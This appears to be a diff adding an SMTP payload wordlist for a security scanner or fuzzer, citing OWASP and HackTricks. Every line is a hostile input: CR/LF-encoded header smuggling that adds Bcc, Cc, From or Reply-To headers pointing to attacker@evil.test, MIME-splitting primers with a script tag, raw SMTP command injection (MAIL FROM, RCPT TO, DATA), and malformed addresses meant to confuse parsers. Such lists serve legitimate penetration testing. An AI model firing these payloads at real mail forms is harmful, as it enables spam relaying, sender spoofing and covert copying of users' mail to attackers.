@@ -1,0 +1,42 @@
+# category: smtp
+# description: SMTP header-injection / email-input abuse — BCC smuggling, from-spoofing, SMTP command injection.
+# references: OWASP Mail Command Injection, HackTricks SMTP Injection.
+
+# ── Header smuggling via CR/LF in user input ────────────────────────────
+victim@test.com%0aBcc:%20attacker@evil.test
+victim@test.com%0d%0aBcc:%20attacker@evil.test
+victim@test.com%0aCc:%20attacker@evil.test
+victim@test.com%0aContent-Type:%20multipart/mixed;%20boundary=xxx
+victim@test.com%0aFrom:%20admin@victim.test
+victim@test.com%0aReply-To:%20attacker@evil.test
+victim@test.com%0aSubject:%20injected
+victim@test.com%0aX-Mailer:%20camio
+
+# ── MIME-split primers ───────────────────────────────────────────────────
+victim@test.com%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
+victim@test.com%0d%0a%0d%0abody-replaced
+
+# ── SMTP command injection (older sendmail / direct smtp sinks) ──────────
+victim@test.com%0aMAIL%20FROM:<attacker@evil.test>%0aRCPT%20TO:<attacker@evil.test>
+victim@test.com%0aRCPT%20TO:<attacker@evil.test>
+victim@test.com%0aDATA
+victim@test.com%0aQUIT
+
+# ── Encoded-email / RFC-5322 abuses ──────────────────────────────────────
+"attacker@evil.test"@victim.test
+attacker@evil.test(victim.test)
+attacker@evil.test,victim@test.com
+attacker@evil.test;victim@test.com
+attacker@evil.test\n,victim@test.com
+=?UTF-8?B?YXR0YWNrZXJAZXZpbC50ZXN0?=
+=?UTF-8?Q?attacker=40evil=2Etest?=
+.attacker@evil.test
+attacker..name@evil.test
+attacker@ev..il.test
+attacker@evil.test.
+"attacker"@evil.test
+"@"@evil.test
+attacker+tag@evil.test
+attacker@[127.0.0.1]
+attacker@[IPv6:::1]
+attacker@xn--80ak6aa92e.com
